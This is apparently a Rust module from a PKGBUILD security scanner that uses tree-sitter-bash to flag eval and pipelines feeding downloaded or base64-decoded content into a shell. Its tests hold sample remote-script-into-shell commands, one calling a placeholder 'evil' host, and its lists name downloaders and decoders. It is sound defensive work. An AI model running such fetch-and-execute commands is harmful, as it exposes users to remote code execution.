//! AST-based detection using `tree-sitter-bash`.
//!
//! Line/substring rules are easy to fool with quoting, comments, and string
//! splitting (`b""ash`, `eval` inside a comment, here-doc bodies). Parsing the
//! script to a syntax tree sidesteps most of that: commands, pipelines, and
//! command substitutions are real nodes, and text inside comments/strings is
//! never mistaken for executable code.
//!
//! This pass is authoritative for the `eval` and pipe-into-shell rules. If the
//! grammar fails to load (it never should), [`scan`] returns `None` and the
//! caller falls back to the line-based heuristics in [`crate::pkgbuild`].

use crate::report::{Finding, Severity};
use tree_sitter::{Node, Parser};

/// Shell interpreters that, as the tail of a pipeline, mean "execute whatever
/// was piped in".
const SHELLS: &[&str] = &["bash", "sh", "zsh", "dash", "ksh", "ash"];

/// Commands that fetch remote content.
const DOWNLOADERS: &[&str] = &["curl", "wget", "fetch", "aria2c"];

/// Commands that decode/inflate an encoded payload.
const DECODERS: &[&str] = &[
    "base64", "xxd", "openssl", "gzip", "gunzip", "zcat", "bunzip2", "xz", "uudecode",
];

/// Run the AST pass over `src`. Returns `None` if the grammar cannot be loaded
/// so the caller can fall back to textual rules.
pub fn scan(src: &str) -> Option<Vec<Finding>> {
    let mut parser = Parser::new();
    parser
        .set_language(&tree_sitter_bash::LANGUAGE.into())
        .ok()?;
    let tree = parser.parse(src, None)?;

    let mut findings = Vec::new();
    let bytes = src.as_bytes();
    walk(tree.root_node(), bytes, &mut findings);
    Some(findings)
}

/// Depth-first walk collecting findings from `command` and `pipeline` nodes.
fn walk(node: Node, src: &[u8], out: &mut Vec<Finding>) {
    match node.kind() {
        "command" => {
            if let Some(name) = command_name(node, src) {
                if name == "eval" {
                    out.push(Finding::at(
                        Severity::Critical,
                        "EVAL",
                        "Use of `eval` (dynamic code execution)",
                        line_of(node),
                    ));
                }
            }
        }
        "pipeline" => inspect_pipeline(node, src, out),
        _ => {}
    }

    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        walk(child, src, out);
    }
}

/// Classify a pipeline: flag remote-script and decoded-payload execution when
/// the pipeline terminates in a shell.
fn inspect_pipeline(node: Node, src: &[u8], out: &mut Vec<Finding>) {
    let mut names = Vec::new();
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        if child.kind() == "command" {
            if let Some(n) = command_name(child, src) {
                names.push(n);
            }
        }
    }
    let Some(last) = names.last() else {
        return;
    };
    if !SHELLS.contains(&base(last)) {
        return;
    }
    let upstream = &names[..names.len() - 1];
    let line = line_of(node);

    if upstream.iter().any(|n| DECODERS.contains(&base(n))) {
        out.push(Finding::at(
            Severity::Critical,
            "BASE64_PIPE_SH",
            "Decoded payload piped into a shell",
            line,
        ));
    }
    if upstream.iter().any(|n| DOWNLOADERS.contains(&base(n))) {
        out.push(Finding::at(
            Severity::Critical,
            "CURL_PIPE_SH",
            "Remote script piped directly into a shell",
            line,
        ));
    }
}

/// Extract the `command_name` text of a `command` node, lower-cased.
fn command_name(node: Node, src: &[u8]) -> Option<String> {
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        if child.kind() == "command_name" {
            return child
                .utf8_text(src)
                .ok()
                .map(|s| s.trim().to_ascii_lowercase());
        }
    }
    None
}

/// Strip a leading path so `/usr/bin/bash` matches `bash`.
fn base(cmd: &str) -> &str {
    cmd.rsplit('/').next().unwrap_or(cmd)
}

/// 1-based line of a node.
fn line_of(node: Node) -> usize {
    node.start_position().row + 1
}

#[cfg(test)]
mod tests {
    use super::*;

    fn codes(src: &str) -> Vec<&'static str> {
        scan(src).unwrap().into_iter().map(|f| f.code).collect()
    }

    #[test]
    fn grammar_loads() {
        assert!(scan("echo hi").is_some());
    }

    #[test]
    fn detects_eval() {
        assert!(codes("eval \"$payload\"").contains(&"EVAL"));
    }

    #[test]
    fn eval_in_comment_is_ignored() {
        assert!(!codes("# eval is mentioned here\necho ok").contains(&"EVAL"));
    }

    #[test]
    fn eval_in_string_is_ignored() {
        assert!(!codes("echo \"please eval this\"").contains(&"EVAL"));
    }

    #[test]
    fn detects_curl_pipe_bash() {
        assert!(codes("curl https://x/i.sh | bash").contains(&"CURL_PIPE_SH"));
    }

    #[test]
    fn detects_full_path_shell() {
        assert!(codes("wget -qO- http://x | /usr/bin/sh").contains(&"CURL_PIPE_SH"));
    }

    #[test]
    fn detects_base64_pipe_sh() {
        let c = codes("echo Zm9v | base64 -d | bash");
        assert!(c.contains(&"BASE64_PIPE_SH"));
    }

    #[test]
    fn detects_inside_function_body() {
        // pkgver()/build() bodies are parsed too.
        let src = "pkgver() {\n  curl https://evil/x | sh\n}";
        assert!(codes(src).contains(&"CURL_PIPE_SH"));
    }

    #[test]
    fn plain_pipe_no_shell_is_clean() {
        assert!(codes("cat f | grep x | sort").is_empty());
    }
}
